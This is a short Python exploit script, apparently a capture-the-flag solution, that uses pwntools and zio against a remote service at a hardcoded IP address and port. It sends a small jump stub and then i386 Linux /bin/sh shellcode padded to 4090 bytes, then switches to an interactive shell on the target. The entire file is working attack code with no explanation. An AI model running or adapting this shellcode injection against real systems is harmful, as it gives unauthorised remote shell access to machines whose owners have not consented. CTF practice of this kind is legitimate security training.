#!/usr/bin/env python
# coding = utf8
from pwn import *
from zio import *

target = ('120.27.130.77',9000)
def get_io(target):
	r_m = COLORED(RAW, "green")
	w_m = COLORED(RAW, "blue")
	io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
	return io

def pwn(io):
	context(arch='i386', os='linux', log_level='debug')
	
	payload = asm("pop edx;mov dl,0xcf;jmp edx;")
	payload2 = asm(pwnlib.shellcraft.i386.linux.sh())
	
	io.gdb_hint()
	io.writeline(payload)
	print disasm(payload2)
	shellcode=payload2.ljust(4090,'a')
	shellcode+=shellcode[:5]
	io.writeline(shellcode)
	io.interact()

pwn(get_io(target))